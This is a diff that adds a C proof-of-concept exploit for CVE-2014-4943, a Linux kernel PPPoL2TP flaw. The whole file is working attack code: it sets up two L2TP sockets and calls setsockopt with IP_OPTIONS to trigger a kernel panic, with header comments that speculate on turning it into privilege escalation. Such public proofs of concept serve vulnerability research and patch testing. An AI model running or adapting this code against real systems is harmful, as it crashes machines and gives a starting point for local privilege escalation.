@@ -1,0 +1,161 @@
+/* ----------------------------------------------------------------------------------------------------
+ * cve-2014-4943_poc.c
+ * 
+ * The PPPoL2TP feature in net/l2tp/l2tp_ppp.c in the Linux kernel through 3.15.6 allows local users to gain privileges by leveraging data-structure 
+ * differences between an l2tp socket and an inet socket. 
+ * 
+ * This is a POC to reproduce vulnerability. No exploitation here, just simple kernel panic.
+ * I have tried to exploit this vulnerability and I am sure there is a way (or several) to elevate privileges.
+ * There are some kernel structures that can be overwriten but I didn't manage to find the ultimate trick to at least point back to userland.
+ * If seems guys at immunuty found a way using race condition.
+ *
+ * 
+ * Compile with gcc -fno-stack-protector -Wall -o cve-2014-4943_poc cve-2014-4943_poc.c  
+ * 
+ * Emeric Nasi - www.sevagas.com
+ *-----------------------------------------------------------------------------------------------------*/
+ 
+
+ 
+/* -----------------------   Includes ----------------------------*/
+
+#include <netinet/ip.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <sys/mman.h>
+#include <linux/net.h>
+#include <linux/udp.h>
+#include <linux/if.h>
+#include <linux/if_pppox.h>
+#include <linux/if_pppol2tp.h>
+
+
+/* -----------------------   Definitions ----------------------------*/
+
+#define TARGET_KERNEL_MIN "3.2.0"
+#define TARGET_KERNEL_MAX "3.15.6"
+#define EXPLOIT_NAME "cve-2014-4943"
+
+
+
+/* -----------------------   functions ----------------------------*/
+
+
+/**
+ * It is possible to modify several parts of socket object using IP options frop UDP setsockopt
+ * For this POC, IP_OPTIONS is the easiest way to panic kernel
+ */
+void modifyUDPvalues(int tunnel_fd)
+{
+/* Extract from kernel code which is vulnerable, here you can see that both udp_setsockopt and ip_setsockopt (on inet_sock) can be used to leverage vulnerability:
+  
+ int udp_setsockopt(struct sock *sk, int level, int optname,
+                    char __user *optval, unsigned int optlen)
+ {
+         if (level == SOL_UDP  ||  level == SOL_UDPLITE)
+                 return udp_lib_setsockopt(sk, level, optname, optval, optlen,
+                                           udp_push_pending_frames);
+         return ip_setsockopt(sk, level, optname, optval, optlen);
+ }
+*/
+  
+  int ip_options = 0x1;
+     
+  if (setsockopt(tunnel_fd, SOL_IP,  IP_OPTIONS, &ip_options, 20) == -1) 
+    {
+        perror("setsockopt (IP_OPTIONS)");   
+    }
+}
+
+
+/**
+ * DOS poc for cve_2014_4943 vulnerability
+ */
+int main()
+{
+
+  int tunnel_fd;
+  int tunnel_fd2;
+  int udp_fd;
+
+  printf("[cve_2014_4943]: Preparing to exploit.\n");
+
+  /* Create first L2TP socket */
+  tunnel_fd = socket(AF_PPPOX, SOCK_DGRAM, PX_PROTO_OL2TP);
+  if (tunnel_fd < 0)
+  {
+    perror("socket(AF_PPPOX, SOCK_DGRAM, PX_PROTO_OL2TP)");
+    return -1;
+  }
+  /* Create second L2TP socket */
+  tunnel_fd2 = socket(AF_PPPOX, SOCK_DGRAM, PX_PROTO_OL2TP);
+  if (tunnel_fd2 < 0)
+  {
+    perror("socket(AF_PPPOX, SOCK_DGRAM, PX_PROTO_OL2TP)");
+    return -1;
+  }
+  if ((udp_fd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) 
+  {
+    perror("cannot create socket"); 
+    return -1; 
+  }
+  
+  /* Connect LT2P socket */
+  struct sockaddr_pppol2tp sax;
+
+  memset(&sax, 0, sizeof(sax));
+  sax.sa_family = AF_PPPOX;
+  sax.sa_protocol = PX_PROTO_OL2TP;
+  sax.pppol2tp.fd = udp_fd;       /* fd of tunnel UDP socket */
+  sax.pppol2tp.addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);// peer_addr->sin_addr.s_addr;
+  sax.pppol2tp.addr.sin_port = htons(1337);//peer_addr->sin_port;
+  sax.pppol2tp.addr.sin_family = AF_INET;
+  sax.pppol2tp.s_tunnel = 8;//tunnel_id;
+  sax.pppol2tp.s_session = 0;     /* special case: mgmt socket */
+  sax.pppol2tp.d_tunnel = 0;
+  sax.pppol2tp.d_session = 0;     /* special case: mgmt socket */
+
+  if(connect(tunnel_fd, (struct sockaddr *)&sax, sizeof(sax) ) < 0 )
+  {
+    perror("connect failed");
+  }
+  
+  /* Connect LT2P socket */
+  struct sockaddr_pppol2tp sax2;
+
+  memset(&sax, 0, sizeof(sax2));
+  sax2.sa_family = AF_PPPOX;
+  sax2.sa_protocol = PX_PROTO_OL2TP;
+  sax2.pppol2tp.s_tunnel = 8;//tunnel_id;
+  sax2.pppol2tp.s_session = 1;     
+  sax2.pppol2tp.d_tunnel = 0;
+  sax2.pppol2tp.d_session = 1;     
+
+  if(connect(tunnel_fd2, (struct sockaddr *)&sax2, sizeof(sax2) ) < 0 )
+  {
+    perror("connect failed");
+  }
+  
+  
+  /*
+     * Entering critical part
+     */
+    printf("[cve_2014_4943]:  Panic!\n");
+  
+  //modifyUDPvalues(tunnel_fd);
+  modifyUDPvalues(tunnel_fd2);
+
+  
+  // close opened socket  
+  puts("\n [+] Closing sockets...");
+  close(tunnel_fd);
+  close(tunnel_fd2);
+    
+  exit(0);
+}
